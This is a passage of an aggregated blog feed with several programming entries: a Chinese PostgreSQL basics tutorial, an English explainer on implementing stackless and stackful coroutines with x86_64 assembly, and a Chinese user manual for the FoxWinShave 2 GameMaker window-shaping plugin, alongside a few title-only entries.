<p>PostgreSQL，简称postgres，是继mysql被收购之后极为热门的开源关系型数据库，这篇文章简单记录一些使用过程中的基本用法。</p>
<h2 id="安装">安装</h2>
<p>为了保证宿主机环境的纯净，这里使用docker来安装postgres</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">docker run --name postgres -p 5432:5432 -e <span class="nv">POSTGRES_PASSWORD</span><span class="o">=</span>password -d postgres
</code></pre></div><p>常用环境变量</p>
<blockquote>
<p>POSTGRES_USER: 数据库用户，缺省postgres</p>
<p>POSTGRES_PASSWORD: 数据库密码 ps. 若从localhost连接则默认trust，不需要填写</p>
<p>POSTGRES_DB: 数据库名，缺省postgres</p>
</blockquote>
<p>更多docker相关内容参考<a href="https://hub.docker.com/_/postgres">postgres官方docker镜像页面</a></p>
<h2 id="常用命令">常用命令</h2>
<p><strong>连接数据库</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">psql -U user -d database -h host -p port
</code></pre></div><p><strong>导入数据</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">psql database &lt; db.sql
</code></pre></div><p><strong>控制台命令</strong></p>
<blockquote>
<p>\h：查看SQL命令的解释，比如\h select。</p>
<p>?：查看psql命令列表。</p>
<p>\l：列出所有数据库。</p>
<p>\c [database_name]：连接其他数据库。</p>
<p>\d：列出当前数据库的所有表格。</p>
<p>\d [table_name]：列出某一张表格的结构。</p>
<p>\du：列出所有用户。</p>
<p>\e：打开文本编辑器。</p>
<p>\conninfo：列出当前数据库和连接的信息。</p>
</blockquote>
<p><strong>数据库操作</strong></p>
<p><em>采用基本sql语法</em></p>
<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="o">#</span> <span class="err">建表</span>
<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="k">IF</span> <span class="k">NOT</span> <span class="k">EXISTS</span> <span class="k">user</span> <span class="p">(</span>
	<span class="n">id</span> <span class="nb">SERIAL</span> <span class="k">PRIMARY</span> <span class="k">KEY</span><span class="p">,</span>
    <span class="n">name</span> <span class="nb">TEXT</span> <span class="k">NOT</span> <span class="k">NULL</span>
<span class="p">);</span>

<span class="o">#</span> <span class="err">插入</span>
<span class="k">INSERT</span> <span class="k">INTO</span> <span class="k">user</span> <span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="k">VALUES</span> <span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">);</span>

<span class="o">#</span> <span class="err">选择</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="k">user</span><span class="p">;</span>

<span class="o">#</span> <span class="err">更新</span>
<span class="k">UPDATE</span> <span class="k">user</span> <span class="k">SET</span> <span class="n">name</span> <span class="o">=</span> <span class="s1">&#39;qwer&#39;</span> <span class="k">WHERE</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

<span class="o">#</span> <span class="err">删除</span>
<span class="k">DELETE</span> <span class="k">FROM</span> <span class="k">user</span> <span class="k">WHERE</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

<span class="o">#</span> <span class="err">添加栏位</span>
<span class="k">ALTER</span> <span class="k">TABLE</span> <span class="k">user</span> <span class="k">ADD</span> <span class="n">gender</span> <span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>

<span class="o">#</span> <span class="err">更新表结构</span>
<span class="k">ALTER</span> <span class="k">TABLE</span> <span class="k">user</span> <span class="k">ALTER</span> <span class="k">COLUMN</span> <span class="n">gender</span> <span class="k">SET</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">;</span>

<span class="o">#</span> <span class="err">字段更名</span>
<span class="k">ALTER</span> <span class="k">TABLE</span> <span class="k">user</span> <span class="k">RENAME</span> <span class="k">COLUMN</span> <span class="n">name</span> <span class="k">TO</span> <span class="n">username</span><span class="p">;</span>

<span class="o">#</span> <span class="err">删除字段</span>
<span class="k">ALTER</span> <span class="k">TABLE</span> <span class="k">user</span> <span class="k">DROP</span> <span class="k">COLUMN</span> <span class="n">gender</span><span class="p">;</span>

<span class="o">#</span> <span class="err">表名更改</span>
<span class="k">ALTER</span> <span class="k">TABLE</span> <span class="k">user</span> <span class="k">RENAME</span> <span class="k">TO</span> <span class="n">users</span><span class="p">;</span>

<span class="o">#</span> <span class="err">删除表格</span>
<span class="k">DROP</span> <span class="k">TABLE</span> <span class="n">users</span><span class="p">;</span>
</code></pre></div><h2 id="相关链接">相关链接</h2>
<blockquote>
<p><a href="http://www.ruanyifeng.com/blog/2013/12/getting_started_with_postgresql.html">PostgreSQL新手入门</a></p>
</blockquote>]]></content>
        <author>
            <name><![CDATA[Creedowl’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/linux%E5%86%85%E6%A0%B8gdb+qemu%E8%B0%83%E8%AF%95/</id>
        <title><![CDATA[Linux内核gdb+qemu调试]]></title>
        <updated>2019-01-28T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/linux%E5%86%85%E6%A0%B8gdb+qemu%E8%B0%83%E8%AF%95/"/>
        <content type="text/html" src="https://doublemice.github.io/linux%E5%86%85%E6%A0%B8gdb+qemu%E8%B0%83%E8%AF%95/"><![CDATA[Linux内核gdb+qemu调试]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://invariant.me/coroutines-part-1-lightweight-threads-for-concurrency/</id>
        <title><![CDATA[Coroutines: Lightweight Threads for Concurrency]]></title>
        <updated>2019-01-12T16:00:00+08:00</updated>
        <link href="https://invariant.me/coroutines-part-1-lightweight-threads-for-concurrency/"/>
        <content type="text/html" src="https://invariant.me/coroutines-part-1-lightweight-threads-for-concurrency/"><![CDATA[<img src="https://images.unsplash.com/photo-1501820434261-5bb046afcf6b?ixlib=rb-1.2.1&q=80&fm=jpg&crop=entropy&cs=tinysrgb&w=2000&fit=max&ixid=eyJhcHBfaWQiOjExNzczfQ" alt="Coroutines: Lightweight Threads for Concurrency"><p><strong>Outdated:</strong> This post was written in January, 2019 and is not currently maintained.</p><!--kg-card-begin: html--><hr><!--kg-card-end: html--><p>In concurrent applications, we need a way to allow different tasks to make progress at the “same” time, which is known as concurrency. The most widely-used technology for concurrency is threads, the minimal execution unit provided by the operating system. However, there is a non-negligible overhead associated with multi-threading, especially when the threads are only performing small, lightweight tasks.</p><p>Multithreading overhead comes from how threads are implemented in operating systems. In Linux, a thread is just a "lightweight" process that shares resources, like virtual memory, with its parent process. When a thread yields control and begins to wait on an event to wake up, the operating system will take over control, find the next suitable process to run, and switch to that process, just like what it would do with normal processes. This introduces a significant overhead for many kinds of multithread applications, especially those requiring frequent message passing between threads. Additionally, when a thread is created or destroyed, the operating system has to initialize or destroy the thread control block (TCB, <code>task_struct</code> in Linux), which is a non-trivial operation.</p><p>Coroutine is a mechanism for reducing multithreading overheads. As a userspace equivalent of threads, coroutines are managed entirely in userspace and is opaque to the underlying OS.</p><h2 id="stackless-coroutines">Stackless Coroutines</h2><p>There are two types of coroutine systems, stackless and stackful. A stackless coroutine system is usually implemented with some kind of language-level transformations, like the CPS (Continuation Passing Style) transformation. A program in CPS form, as its name suggests, instead of passing the results of computations by return values, passes them by “continuations”, which looks like:</p><pre><code>// Original form
let a = f1()
let b = f2(a)
print(b)

// CPS form
f1(
    a =&gt; f2(
        a,
        b =&gt; print(b)
    )
)
</code></pre><p>The code above looks like the ancient JavaScript callback pattern, doesn't it? JavaScript is by design single threaded and asynchronous, and blocking operations have to be implemented with callbacks. In fact, this kind of callbacks is an explicit form of CPS, regardless of whether <code>Promise</code> is used to avoid problems like <a href="https://en.wiktionary.org/wiki/callback_hell">callback hell</a>. To simplify programming, <code>async/await</code> syntax is introduced later, which enables users to write code that looks synchronous but is in fact asynchronous, and is usually implemented with automatic CPS transformation.</p><p>Another approach to stackless coroutine is to make use of a big <code>switch</code> loop:</p><pre><code>// Original form
int f1(int a) {
    int i, v = 0;
    for(i = 0; i &lt; a; i++) v += i;
    return v;
}

// Stackless coroutine
struct Local {
    int i;
    int v;
};
int f1(int a, int state, struct Local *local, int *out) {
    switch(state) {
        case 0:
            local-&gt;i = 0;
            local-&gt;v = 0;
            return 1;
        case 1:
            if(local-&gt;i &lt; a) {
                local-&gt;v += local-&gt;i;
                local-&gt;i++;
                return 1;
            } else {
                *out = local-&gt;v;
                return -1;
            }
    }
}
</code></pre><p>In the code above, we maintain the execution state of <code>f1</code> outside of itself, therefore allowing recovery of its execution at any point of time as long as we preserve <code>state</code> and <code>local</code>.</p><h2 id="stackful-coroutines">Stackful Coroutines</h2><p>Stackless coroutines are “stackless” because they do not explicitly preserve the call stack, while stackful coroutine systems allocate a new call stack for each coroutine. Compared to stackless coroutines, stackful coroutines usually do not need language-level transformations, making it easier to be integrated into different programming languages.</p><p>When the OS switches tasks, it needs to save the machine state of the old task and load the new task’s one. A machine state contains all used registers, along with in-memory data that should be preserved, e.g. the call stack. As we are going to do coroutine switching in userspace, we have to manually implement the logic for switching machine states.</p><p>For convenience, in this section, we assume that our platform is Linux on a x86_64 machine and we are implementing cooperative scheduling. Therefore, we need to follow the x86_64 System V ABI when dealing with calling conventions. The ABI specifies that the registers <code>rbx</code>, <code>rbp</code>, <code>r12</code>, <code>r13</code>, <code>r14</code> and <code>r15</code> are callee saved, so they must be saved before switching to another coroutine.</p><p>Let’s start from the coroutine switching function:</p><pre><code>asm(
    "_co_switch:\n"
    "push %rbx\n"
    "push %rbp\n"
    "push %r12\n"
    "push %r13\n"
    "push %r14\n"
    "push %r15\n"
    "mov (%rdi), %rax\n"
    "mov %rsp, (%rdi)\n"
    "mov %rax, %rsp\n"
    "pop %r15\n"
    "pop %r14\n"
    "pop %r13\n"
    "pop %r12\n"
    "pop %rbp\n"
    "pop %rbx\n"
    "ret\n"
);
</code></pre><p>The <code>co_switch</code> function pushes all current callee-saved registers onto the current stack, swaps <code>(%rdi)</code> (the memory pointed to by the first argument, target stack address here) with the stack pointer <code>%rsp</code>, loads the callee-saved registers of the target coroutine, and then executes <code>ret</code> to return in the target coroutine.</p><p>Suppose we have a coroutine <code>A</code> that has just executed the instruction <code>mov %rax, %rsp</code>. At this point, we are sure that the old stack, which is swapped out into memory location <code>(%rdi)</code>, has the following layout (from lower address to higher address):</p><pre><code>[r15] [r14] [r13] [r12] [rbp] [rbx] [return_address]
</code></pre><p>A coroutine can only be switched out with <code>co_switch</code>, so its stack must have the same layout. Therefore, since we are already on the target stack after executing <code>mov %rax, %rsp</code>, we can pop the saved registers in the reverse order, from <code>r15</code> to <code>rbx</code>. Then, the <code>ret</code> instruction is executed, which pops the return address and jumps to it, and the caller code on the target coroutine observes a normal return from <code>co_switch</code>.</p><p>However, we just assumed that we already have a coroutine switched out previously, and some other logic is required for starting a new coroutine.</p><p>We have to construct the stack layout:</p><pre><code>[r15] [r14] [r13] [r12] [rbp] [rbx] [return_address]
</code></pre><p>The values of the saved registers can be arbitrary, since there’s no old registers to save. To construct a valid “return” address, a trampoline is needed:</p><pre><code>asm(
    "_pre_call_entry:\n"
    "pop %rax\n" // entry
    "pop %rdi\n" // userdata
    "call *%rax\n"
    "ud2\n"
);
</code></pre><p><code>pre_call_entry</code> pops a function pointer <code>entry</code> and the associated <code>userdata</code> from the stack, calls <code>entry</code> with <code>userdata</code> as its only argument, then executes <code>ud2</code> to indicate <code>entry</code> should never return. Therefore, we need to include <code>entry</code> and <code>userdata</code> in our stack construction:</p><pre><code>[r15] [r14] [r13] [r12] [rbp] [rbx] [return_address] [entry] [userdata]
</code></pre><p>With the two assembly functions and the expected stack layout, now we can write the code to start a coroutine:</p><pre><code>void co_switch(void **stack);
void pre_call_entry();

struct Coroutine;

typedef void (*CoEntry)(struct Coroutine *co);

struct Coroutine {
    void *stack;
    CoEntry entry;
    int terminated;
};

void call_entry(struct Coroutine *co) {
    co_switch(&amp;co-&gt;stack);
    co-&gt;entry(co);
    co-&gt;terminated = 1;
    co_switch(&amp;co-&gt;stack);
}

void start_coroutine(struct Coroutine *co) {
    void **stack = (void **) co-&gt;stack;

    *(--stack) = co;
    *(--stack) = call_entry; // 16-byte aligned

    *(--stack) = pre_call_entry;

    *(--stack) = 0;
    *(--stack) = 0;
    *(--stack) = 0;
    *(--stack) = 0;
    *(--stack) = 0;
    *(--stack) = 0;

    co-&gt;stack = (void *) stack;

    co_switch(&amp;co-&gt;stack);
}
</code></pre><p>The full example code is available on my <a href="https://gist.github.com/losfair/60af3f0c565470e305b6c021ce57e3dc">GitHub Gist</a>.</p><h1 id="optimizations-and-tricks">Optimizations and Tricks</h1><ul><li><code>ret</code> in <code>co_switch</code> can be replaced by an explicit <code>pop</code> and <code>jmp</code> to avoid <a href="https://stackoverflow.com/questions/22442766/return-address-prediction-stack-buffer-vs-stack-stored-return-address">return address prediction failures</a>.</li><li>If your coroutines are extremely lightweight and usually use a very small space on the stack, we can use a fixed memory region as the execution stack (“shared stack”) and copy in/out the used range (<code>stack_end - sp</code>) of the coroutine stack when switching in/out of a coroutine. Although memory copying is needed, this approach can save a lot of memory while still allowing to use guard pages to ensure safety.</li><li>To implement cross-platform stackful coroutines without writing assembly, the <code>pthread_*</code> functions can be used along with <code>setjmp</code> and <code>longjmp</code> to initialize the machine state on a new stack and switch between stacks, without actually using OS threads.</li></ul>]]></content>
        <author>
            <name><![CDATA[The Invariant]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.noisyfox.io/foxwinshave2.html</id>
        <title><![CDATA[FoxWinShave 2 中文使用手册]]></title>
        <updated>2019-01-12T08:45:27+08:00</updated>
        <link href="https://www.noisyfox.io/foxwinshave2.html"/>
        <content type="text/html" src="https://www.noisyfox.io/foxwinshave2.html"><![CDATA[<p>FoxWinShave 2 现已上架 GameMaker: Marketplace，支持 GM8, GMS 1.4 和 GMS 2。<a href="https://marketplace.yoyogames.com/assets/7696/foxwinshave" target="_blank" rel="noreferrer noopener" aria-label="（在新窗口打开）">点此从Marketplace下载最新版本</a>。</p>



<hr class="wp-block-separator"/>



<h2>0. 前置条件</h2>



<ul><li>仅支持 Windows 平台。</li><li>支持 Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10。</li><li>支持 GameMaker 7, GameMaker 8, GameMaker 8.1, GameMaker Studio 1.4.x, GameMaker Studio 2 Desktop。</li></ul>



<hr class="wp-block-separator"/>



<h2>1. 安装插件</h2>



<h3>1.0 GM 7, 8, 8.1</h3>



<p>菜单栏 File-&gt; Import Resources&#8230; 选择 FoxWinShave-GM8.gmres 导入插件及 Demo。</p>



<ul><li>在弹出的 Importing Resources 对话框中，请务必勾选 Scripts 和 Include Files 以导入插件运行所必须的文件和脚本。</li><li>如需同时导入 Demo 代码及素材，请将 Sprites，Objects 和 Rooms 一并勾选上。</li></ul>



<h3>1.1 GMS 1.4.x 及 GMS 2 Desktop</h3>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/image.png" target="_blank" rel="noreferrer noopener"><img loading="lazy" width="300" height="189" src="https://www.noisyfox.io/wp-content/uploads/2019/01/image-300x189.png" alt="" class="wp-image-569" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/image-300x189.png 300w, https://www.noisyfox.io/wp-content/uploads/2019/01/image-768x483.png 768w, https://www.noisyfox.io/wp-content/uploads/2019/01/image-1024x644.png 1024w, https://www.noisyfox.io/wp-content/uploads/2019/01/image.png 1588w" sizes="(max-width: 300px) 100vw, 300px" /></a><figcaption>Import resources: FoxWinShave 对话框</figcaption></figure></div>



<ol><li>在 GameMaker: Marketplace 上购买本插件。<a rel="noreferrer noopener" aria-label="（在新窗口打开）" href="https://marketplace.yoyogames.com/assets/7696/foxwinshave" target="_blank">（点此购买）</a></li><li>在 GMS 中菜单栏选择 Marketplace -&gt; MyLibrary，找到 FoxWinShave，点击 Download。</li><li>下载完成后，点击 Import。</li><li>在弹出的 Import resources: FoxWinShave 对话框中，选中 Scripts 和 Included Files，然后点击中间的 Add 按钮以导入插件运行所必须的文件和脚本。</li><li>如需同时导入 Demo 代码及素材，那就直接点击中间的 Add All 按钮。</li><li>点击左下角 Import 按钮完成插件的导入。</li></ol>



<hr class="wp-block-separator"/>



<h2>2. 插件入门 101</h2>



<h3>2.0 基础准备</h3>



<p>请务必在游戏设置中将窗口设置为无边框（borderless window）:</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/image-2.png" target="_blank" rel="noreferrer noopener"><img loading="lazy" width="300" height="240" src="https://www.noisyfox.io/wp-content/uploads/2019/01/image-2-300x240.png" alt="" class="wp-image-592" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/image-2-300x240.png 300w, https://www.noisyfox.io/wp-content/uploads/2019/01/image-2.png 512w" sizes="(max-width: 300px) 100vw, 300px" /></a><figcaption>GM 8 设置无边框</figcaption></figure></div>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/image-1.png" target="_blank" rel="noreferrer noopener"><img loading="lazy" width="300" height="237" src="https://www.noisyfox.io/wp-content/uploads/2019/01/image-1-300x237.png" alt="" class="wp-image-591" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/image-1-300x237.png 300w, https://www.noisyfox.io/wp-content/uploads/2019/01/image-1.png 695w" sizes="(max-width: 300px) 100vw, 300px" /></a><figcaption>GMS 2 设置无边框</figcaption></figure></div>



<p>稍后将会解释需要设置为无边框的原因。</p>



<h3>2.1 插件初始化</h3>



<p>使用本插件的任何脚本前需要先进行插件的初始化。建议在首个 Room 的 Creation Code 内或者某个控制用的 Object 的 Game Start 事件里执行：</p>


<pre class="brush: cpp; title: ; notranslate">
NF_WS_Init();
</pre>


<p>插件初始化后请勿再次调用该函数。</p>



<h3>2.2 插件释放</h3>



<p>当不再需要更改窗口形状后，可以执行以下函数将插件卸载以释放资源：</p>


<pre class="brush: cpp; highlight: [2]; title: ; notranslate">
NF_WS_ResetWindow(); // 重置窗口形状为默认，非必要
NF_WS_Free(); // 释放插件
</pre>


<p>在释放插件后如果需要再次使用本插件，需要重新进行插件的初始化。</p>



<h3>2.3 基础原理解释</h3>



<h4>2.3.0 窗口坐标系</h4>



<p>将游戏窗口想象成一个画布，按照窗口的边框开始算左上角坐标为 (0, 0)，右下角边框最外处坐标为 (viewport_width + 左边框宽 + 右边框宽, viewport_height + 上边框高 + 下边框高)，如下图所示：</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/win-coord-1.png" target="_blank" rel="noreferrer noopener"><img loading="lazy" width="574" height="447" src="https://www.noisyfox.io/wp-content/uploads/2019/01/win-coord-1.png" alt="" class="wp-image-635" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/win-coord-1.png 574w, https://www.noisyfox.io/wp-content/uploads/2019/01/win-coord-1-300x234.png 300w" sizes="(max-width: 574px) 100vw, 574px" /></a><figcaption> <br>窗口坐标系统 </figcaption></figure></div>



<p>然而问题在于窗口的边框宽度是由 Windows 系统定义的，不同 Windows 版本或者不同的主题都有可能带有不同尺寸的边框，给在定义窗口的形状时计算坐标带来了麻烦。因此如上文所述，请<strong>务必</strong>在游戏全局设置中关闭窗口边框的显示，这样窗口的坐标系统就和游戏 View Port 的坐标系统的原点能够统一，便于将窗口形状与游戏绘制内容对齐。</p>



<p>下文在描述坐标时将默认使用无边框窗口。</p>



<h4>2.3.1 游戏绘制与 View Port</h4>



<p>GM 支持在一个窗口中同时显示多个 View Port。View Port 的作用是将 Room 的一部分内容按一定比例、缩放和位移映射在窗口中显示出来。用户实际看到的内容是经过 View Port 变换后的结果，并不（一定）是游戏中调用绘制代码时使用的坐标。</p>



<p>由于我们只关心用户实际看到了什么，因此下文中提到的<strong>“游戏绘制内容”</strong>的尺寸、坐标，皆为经过 View Port 变换后映射到窗口坐标系中的尺寸和坐标。</p>



<p>更多关于 View Port 的内容，请参考 GM 官方文档，下文将不再赘述。</p>



<h4>2.3.2 窗口形状遮罩</h4>



<p>本插件采用遮罩形式设置窗口形状，支持根据 Sprite 和 Surface（仅限 GMS）设置窗口遮罩。以下核心函数</p>


<pre class="brush: cpp; title: ; notranslate">
NF_WS_ShaveWindow(sprite, subimage, x, y);
NF_WS_ShaveWindowAlpha(sprite, subimage, x, y, alpha);
NF_WS_ShaveWindowExt(sprite, subimage, x, y, xscale, yscale, alpha);
NF_WS_ShaveWindowSurfaceExt(surface, x, y, xscale, yscale, alpha); // 仅限 GMS
</pre>


<p>与 draw_sprite_* 系列绘制函数有着十分类似的形式，除了不支持 rot 和  <br>colour参数，同时 alpha 参数有不同的意义。可以理解为将给定的 Sprite / Surface 用提供的参数放置于窗口坐标系内作为遮罩（不经过 View Port 等任何变换），同时将窗口没有被遮罩覆盖的区域给“消去”变为透明：</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/mask.png" target="_blank" rel="noreferrer noopener"><img loading="lazy" width="640" height="480" src="https://www.noisyfox.io/wp-content/uploads/2019/01/mask.png" alt="" class="wp-image-654" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/mask.png 640w, https://www.noisyfox.io/wp-content/uploads/2019/01/mask-300x225.png 300w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption>“遮罩层”内容</figcaption></figure></div>



<p>如图所示，红色部分的窗口会被保留下来，其余部分将会被消去。需要注意的是上图所谓的“遮罩层”是一个与窗口同样大小的位于窗口之上的想象出的一层，并不是实际存在的可见图层，其内容仅为了作为遮罩所用，并不会显示出来。</p>



<p>遮罩层使用的图像为彩色图像带 Alpha 通道。在实际运行时色彩通道会被完全忽略，最终窗口形状仅受遮罩层的 Alpha 通道影响。默认情况下每个 Alpha 通道值为 0 的像素（即纯透明像素）被认为是窗口需要被消去的部分。这个值可以通过上文所述的几个函数中的 alpha 参数（范围 [0, 1.0]）来改变。任何 Alpha 通道值 &lt;= 该参数的像素将被认为是需要消去的。注意，这意味着如果你传入的 alpha 参数为 1，则<strong>任何</strong>像素都会被认定为透明像素。</p>



<p>另外，如果使用 Surface 来传入遮罩内容，请注意 Surface 的背景需要用透明色填充：</p>


<pre class="brush: cpp; highlight: [2]; title: ; notranslate">
surface_set_target(mask_surface);
draw_clear_alpha(c_white, 0); // Alpha = 0, 使用的颜色无所谓.
</pre>


<h4>2.3.3 遮罩对齐</h4>



<p>使用本插件的目的通常是想将游戏窗口的形状，裁剪成游戏绘制的有意义的内容的形状：</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/purpose.png" target="_blank" rel="noreferrer noopener"><img loading="lazy" width="640" height="480" src="https://www.noisyfox.io/wp-content/uploads/2019/01/purpose-1.png" alt="" class="wp-image-661" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/purpose-1.png 640w, https://www.noisyfox.io/wp-content/uploads/2019/01/purpose-1-300x225.png 300w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption>游戏实际绘制内容</figcaption></figure></div>



<p>上图中，女牛仔的部分是有意义的、需要保留的部分，而黑色背景需要被裁剪掉，也就意味着我们在遮罩层“绘制”的遮罩需要与女牛仔的位置、形状相同。</p>



<p>这乍一听似乎很容易，只要使用相同的 x，y 参数将同样的女牛仔 Sprite 绘制到 Application Surface 和遮罩层即可。但是正如上文所说，用户实际看到的内容是经过 View Port 变换过的，因此其实际显示的坐标和尺寸可能与绘制时传入的参数不同；然而遮罩层是不受 View Port 影响的，因此开发者需要自行计算遮罩层图像的位置和尺寸，用以对齐经过 View Port 变换后的游戏内容。建议不要用过于复杂的 View Port 设置。</p>



<h4>2.3.4 窗口形状更新时间与绘制事件顺序</h4>



<p>由于 GM 运行原理所致，游戏绘制的内容并不会在绘制语句执行的瞬间显示出来，而是要等到当前 Step 所有绘制完成后才会刷新绘制缓存以显示绘制的内容。这意味着窗口外形的更新需要与绘制内容的刷新同步发生，否则就会发生窗口形状与所显示内容有所偏差的问题（比如游戏仍然显示的是上一帧的内容，但是窗口形状已经被裁剪成了下一帧所需的形状）：</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/image-4.png" target="_blank" rel="noreferrer noopener"><img loading="lazy" width="286" height="262" src="https://www.noisyfox.io/wp-content/uploads/2019/01/image-4.png" alt="" class="wp-image-669"/></a><figcaption> <br>绘制内容与窗口形状没有同步更新 </figcaption></figure></div>



<p>由于 Windows 窗口外形更新时机所限，本插件需要在 GM 的每个 Step 中，于每个 Step 开始 （Begin Step）至 Draw 系列事件开始之前对窗口形状进行更新，以保证窗口形状的更新与绘制内容的更新能够同步完成。如果在 Draw 系列事件中进行窗口形状的修改，则会发生窗口形状与绘制内容不同步的问题，请务必注意。建议在 End Step 事件之中更新窗口形状。</p>



<p>再次提示，请<strong>不要</strong>在 Draw <strong>系列</strong>事件中更新窗口形状！除非你十分清楚可能发生的后果！</p>



<h3>2.4 复杂遮罩</h3>



<p>多次执行以下任意核心函数来改变窗口形状，则后一次的遮罩将会覆盖前一次的遮罩，<strong>并不会</strong>互相叠加：</p>


<pre class="brush: cpp; title: ; notranslate">
NF_WS_ShaveWindow(sprite, subimage, x, y);
NF_WS_ShaveWindowAlpha(sprite, subimage, x, y, alpha);
NF_WS_ShaveWindowExt(sprite, subimage, x, y, xscale, yscale, alpha);
NF_WS_ShaveWindowSurfaceExt(surface, x, y, xscale, yscale, alpha); // 仅限 GMS
</pre>


<p>这意味着如果所需的遮罩是由多个元素组合而成的复杂形状，则需要开发者自行准备好已经事先组合好所有元素的<strong>单张</strong> Sprite / Surface 用作实际的遮罩。</p>



<p>举例来说，如果你需要在屏幕上显示两位女牛仔，那么你需要准备如下的<strong>一张</strong> Sprite / Surface 作为遮罩：</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/complex.png" target="_blank" rel="noreferrer noopener"><img loading="lazy" width="640" height="480" src="https://www.noisyfox.io/wp-content/uploads/2019/01/complex.png" alt="" class="wp-image-678" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/complex.png 640w, https://www.noisyfox.io/wp-content/uploads/2019/01/complex-300x225.png 300w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption>复杂遮罩</figcaption></figure></div>



<p>连续调用两次 NF_WS_ShaveWindow_* 函数并不能实现如上所述的需求。假设第一次传入了左侧牛仔的遮罩，第二次传入了右侧的遮罩，则只有右侧会正常显示出来，而第一次设置的遮罩会被覆盖而失效。</p>



<hr class="wp-block-separator"/>



<h2>3. 常见问题</h2>



<ol><li>使用 Sprite 做遮罩时要注意所用 Sprite 的 xoffset 和 yoffset。</li></ol>
<p><a rel="nofollow" href="https://www.noisyfox.io/foxwinshave2.html">FoxWinShave 2 中文使用手册</a>，首发于<a rel="nofollow" href="https://www.noisyfox.io">狐狸的小小窝</a>。</p>]]></content>
        <author>
            <name><![CDATA[狐狸的小小窝]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%94%BB%E5%87%BB%E9%9D%A2%E5%8F%8Actf%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97/</id>
        <title><![CDATA[智能合约攻击面及ctf出题指南]]></title>
        <updated>2019-01-03T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%94%BB%E5%87%BB%E9%9D%A2%E5%8F%8Actf%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97/"/>
        <content type="text/html" src="https://doublemice.github.io/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%94%BB%E5%87%BB%E9%9D%A2%E5%8F%8Actf%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97/"><![CDATA[智能合约攻击面及ctf出题指南]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/11/06/%E5%8D%A1%E4%B8%81%E8%BD%A6%E4%B8%8E%E7%8C%AB/</id>
        <title><![CDATA[卡丁车与猫]]></title>
        <updated>2018-11-25T13:28:17+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/11/06/%E5%8D%A1%E4%B8%81%E8%BD%A6%E4%B8%8E%E7%8C%AB/"/>
